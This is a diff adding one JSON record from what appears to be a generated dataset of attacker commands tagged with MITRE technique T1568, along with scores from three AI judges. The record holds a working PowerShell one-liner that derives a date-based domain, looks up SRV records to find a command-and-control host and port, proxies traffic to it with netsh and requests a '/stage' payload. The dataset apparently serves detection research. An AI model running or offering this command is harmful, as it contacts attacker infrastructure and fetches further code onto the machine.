@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$base='relay'+(Get-Date -Format 'yyyyMM')+'.net';$d='_c2._tcp.'+$base;try{$srv=Resolve-DnsName $d -Type SRV -ErrorAction Stop|Select-Object -First 1;$target=$srv.NameTarget.TrimEnd('.');$port=[int]$srv.Port;$a=Resolve-DnsName $target -Type A -ErrorAction Stop;$ip=($a|Get-Random).IPAddress;netsh interface portproxy set v4tov4 listenaddress=127.0.0.1 listenport=$port connectaddress=$ip connectport=$port;Invoke-WebRequest -Uri ('http://127.0.0.1:'+ $port +'/stage') -UseBasicParsing -Headers @{SRV=$target;Dom=$base} -TimeoutSec 5}catch{}",
+  "explanation": "Uses SRV records to dynamically discover both the host and port for C2, resolves the SRV target, and forwards local traffic to the dynamically selected endpoint.",
+  "rationale_steps": [
+    "Query SRV to obtain service target and port, enabling dynamic parameterization.",
+    "Resolve target's A record and set up portproxy for stealthy indirection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-0a23acf2-90bc6b6a",
+  "source_prompt_hash": "0a23acf2",
+  "timestamp_utc": "2025-09-30T09:39:46.357850Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid flag formats, and appropriate error handling with try/catch.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1568 (Dynamic Resolution) by algorithmically generating a domain name based on the current date, resolving SRV records to dynamically discover C2 infrastructure, and establishing a connection through port forwarding.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T06:45:22.611866Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with correct PowerShell cmdlet usage, variable assignments, string concatenations, type casting, and proper external command invocation (netsh), free of any syntax errors or imbalances.",
+        "semantic_score": 3,
+        "semantic_justification": "The command perfectly achieves the dynamic resolution aspect of T1568 by algorithmically generating a domain, resolving SRV records for host/port, and A records for IP; however, the crucial `netsh portproxy` command, intended to forward traffic, requires elevated privileges and will fail under the stated 'Privilege: None' condition, making the full operational chain implausible.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T06:45:38.958696Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell is well-formed with balanced quotes/parentheses, valid cmdlets and parameters, proper statement separators, and a valid try/catch block.",
+        "semantic_score": 4,
+        "semantic_justification": "It algorithmically builds a domain, uses SRV to dynamically obtain host and port, resolves A and randomly selects an IP (dynamic resolution), and attempts local proxying and beaconing, but the netsh portproxy step typically requires admin rights so forwarding may fail under the stated 'Privilege: None'.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T06:46:00.600614Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
